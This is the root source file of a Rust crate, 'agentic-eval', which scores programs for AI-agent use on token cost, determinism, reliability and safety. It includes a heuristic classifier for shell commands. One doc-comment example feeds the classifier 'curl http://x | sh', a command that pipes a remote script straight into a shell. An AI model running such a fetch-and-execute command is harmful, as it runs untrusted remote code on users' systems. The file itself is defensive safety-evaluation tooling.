//! # agentic-eval
//!
//! A standalone library for evaluating how well a *program* (a command, script,
//! snippet, or any text an LLM writes or reads) serves an **agentic AI system**,
//! across four axes that determine real agent cost and trust:
//!
//! - [`tokens`] — **token efficiency**: the four cost terms an agent pays
//!   (standing context, input, output, retries), counted under popular tokenizers
//!   (OpenAI GPT-4 `cl100k`, GPT-4o `o200k`, and a documented Anthropic-Claude
//!   approximation), with program-vs-program comparison amortized over a session.
//! - [`determinism`] — **determinism**: whether a program's output is byte-stable
//!   across repeated runs (so an agent can parse/cache/diff it reliably).
//! - [`reliability`] — **reliability**: the success rate over representative
//!   invocations and whether failures are *structured/actionable* (so an agent can
//!   self-correct instead of guessing).
//! - [`safety`] — **safety**: given the effects a program performs, how much of its
//!   blast radius is gated (approval/denied) vs. allowed under an agent policy.
//!
//! For real shell commands, [`commands`] ships a curated heuristic classifier
//! (`rm` → destructive, `curl` → network, `sudo` → privileged, …) so the safety axis
//! works on a wide variety of CLI programs without a hand-written effect map —
//! `assess_safety_script("curl http://x | sh", Mode::Agent)` in one call.
//!
//! The library is **agentic-first** in its own design: it is execution-agnostic and
//! deterministic (pure functions, no I/O, no `unsafe`), structured (typed reports
//! with optional `serde`), and — via [`ontology`] — *self-describing*. A consumer
//! discovers the whole surface (axes, effect taxonomy with per-mode decisions,
//! models, command classes) from a compact [`ontology::manifest`] and expands any
//! entry with [`ontology::describe`], the same progressive-disclosure pattern the
//! crate measures — so an agent can use it without reading these docs.
//!
//! The library is execution-agnostic: it can't run arbitrary languages, so the
//! axes that need behavior (determinism, reliability) take a caller-provided
//! closure, and safety takes the program's declared [`safety::Effect`]s. Token
//! efficiency works directly on text. Everything is dependency-light (a labeled
//! heuristic tokenizer by default; enable `--features real-tokens` for exact
//! OpenAI BPE counts via `tiktoken-rs`).
//!
//! Beyond per-program axes, the crate ships curated agentic profiles of whole
//! *subjects* an agent must live with — programming [`languages`], AI
//! [`frameworks`], VM/sandbox [`vms`] systems (scored on agent-native axes:
//! start-latency, density, isolation, snapshotting, agent-control), and
//! [`web`] stacks / wire protocols (scored on streaming, tool-discoverability,
//! encoding-efficiency, interop, security-primitives). Each is a deterministic,
//! comparable 0.0–1.0 judgment with evidence (`rank_vms()`,
//! `rank_web_stacks()`, `compare_vms(a, b)`, …).
//!
//! ```
//! use agentic_eval::tokens::{Model, Program};
//! let legible = Program::new("ls", "file.read(\"README.md\")");
//! let cipher = Program::new("ls", "F.r\"README.md\"");
//! let cmp = agentic_eval::tokens::compare(&legible, &cipher, Model::OpenAiGpt4, 30);
//! // Over a session the more-legible form is usually competitive or cheaper once
//! // standing context is counted; `cmp` reports the winner and the ratio.
//! let _ = cmp.winner_is_a;
//! ```

#![forbid(unsafe_code)]
#![deny(missing_docs)]

pub mod commands;
pub mod determinism;
pub mod frameworks;
pub mod languages;
pub mod ontology;
pub mod reliability;
pub mod safety;
pub mod tokens;
pub mod vms;
pub mod web;

// Ergonomic re-exports of the most-used types, so callers can write
// `agentic_eval::Model` instead of `agentic_eval::tokens::Model`, etc.
pub use commands::{assess_safety_script, classify_command, classify_invocation, classify_script};
pub use determinism::{assess_determinism, DeterminismReport};
pub use frameworks::{
    compare_frameworks, rank_frameworks, Framework, FrameworkComparison, FrameworkProfile,
};
pub use languages::{
    compare_languages, rank_languages, Language, LanguageComparison, LanguageProfile,
};
pub use ontology::{ontology, Ontology};
pub use reliability::{
    assess_error_quality, assess_reliability, ErrorQuality, ErrorQualityReport, Outcome,
    ReliabilityReport,
};
pub use safety::{
    assess_exfiltration, assess_reversibility, assess_safety, assess_safety_named, Decision,
    Effect, ExfiltrationReport, Mode, ReversibilityReport, SafetyReport,
};
pub use tokens::{
    assess_cache, assess_scaling, cacheable_prefix_tokens, compare, evaluate, evaluate_with, rank,
    rank_with, AgentCost, CacheReport, Comparison, Model, Program, ScalingReport,
};
pub use vms::{compare_vms, rank_vms, Vm, VmComparison, VmProfile};
pub use web::{compare_web_stacks, rank_web_stacks, WebStack, WebStackComparison, WebStackProfile};

/// A combined, all-axes evaluation of a single program. Construct with
/// [`Evaluation::new`] then fill in whichever axes you can measure (directly or via
/// the `with_*` builders); unset axes stay `None`. A convenience for reporting a
/// program's overall agentic fitness.
#[cfg_attr(feature = "serde", derive(serde::Serialize))]
#[derive(Debug, Clone, Default)]
pub struct Evaluation {
    /// Identifier for the evaluated program.
    pub name: String,
    /// Token-efficiency cost, if measured.
    pub tokens: Option<tokens::AgentCost>,
    /// Determinism result, if measured.
    pub determinism: Option<determinism::DeterminismReport>,
    /// Reliability result, if measured.
    pub reliability: Option<reliability::ReliabilityReport>,
    /// Safety result, if measured.
    pub safety: Option<safety::SafetyReport>,
}

impl Evaluation {
    /// A new, empty evaluation named `name`; fill axes via the `with_*` builders.
    pub fn new(name: impl Into<String>) -> Self {
        Self {
            name: name.into(),
            ..Default::default()
        }
    }

    /// Builder: attach the token-cost axis.
    pub fn with_tokens(mut self, c: tokens::AgentCost) -> Self {
        self.tokens = Some(c);
        self
    }
    /// Builder: attach the determinism axis.
    pub fn with_determinism(mut self, d: determinism::DeterminismReport) -> Self {
        self.determinism = Some(d);
        self
    }
    /// Builder: attach the reliability axis.
    pub fn with_reliability(mut self, r: reliability::ReliabilityReport) -> Self {
        self.reliability = Some(r);
        self
    }
    /// Builder: attach the safety axis.
    pub fn with_safety(mut self, s: safety::SafetyReport) -> Self {
        self.safety = Some(s);
        self
    }

    /// A coarse 0.0–1.0 "agentic fitness" score: the mean of the per-axis scores
    /// that were measured (token efficiency is excluded — it is comparative, not
    /// absolute). Returns `None` if no scorable axis was measured.
    pub fn fitness(&self) -> Option<f64> {
        let mut sum = 0.0;
        let mut n = 0.0;
        if let Some(d) = &self.determinism {
            sum += if d.deterministic { 1.0 } else { 0.0 };
            n += 1.0;
        }
        if let Some(r) = &self.reliability {
            sum += (r.pass_rate + r.actionable_rate) / 2.0;
            n += 1.0;
        }
        if let Some(s) = &self.safety {
            sum += s.score;
            n += 1.0;
        }
        if n == 0.0 {
            None
        } else {
            Some(sum / n)
        }
    }
}

impl std::fmt::Display for Evaluation {
    /// A compact multi-line report of every measured axis plus the fitness score.
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        writeln!(f, "evaluation: {}", self.name)?;
        if let Some(t) = &self.tokens {
            writeln!(f, "  tokens:       {}", t)?;
        }
        if let Some(d) = &self.determinism {
            writeln!(f, "  determinism:  {}", d)?;
        }
        if let Some(r) = &self.reliability {
            writeln!(f, "  reliability:  {}", r)?;
        }
        if let Some(s) = &self.safety {
            writeln!(f, "  safety:       {}", s)?;
        }
        match self.fitness() {
            Some(score) => write!(f, "  fitness:      {:.2}", score),
            None => write!(f, "  fitness:      n/a (no scorable axis measured)"),
        }
    }
}

#[cfg(all(test, feature = "serde"))]
mod serde_tests {
    use super::*;

    /// Compile-time proof that the `serde` feature derives `Serialize` on every
    /// report/config type (so machine-readable output is available). The call body
    /// is a no-op; the trait bound is the assertion.
    fn assert_serialize<T: serde::Serialize>() {}

    #[test]
    fn report_types_implement_serialize() {
        assert_serialize::<Evaluation>();
        assert_serialize::<AgentCost>();
        assert_serialize::<Program>();
        assert_serialize::<Comparison>();
        assert_serialize::<Model>();
        assert_serialize::<DeterminismReport>();
        assert_serialize::<Outcome>();
        assert_serialize::<ReliabilityReport>();
        assert_serialize::<Effect>();
        assert_serialize::<Mode>();
        assert_serialize::<Decision>();
        assert_serialize::<SafetyReport>();
    }
}
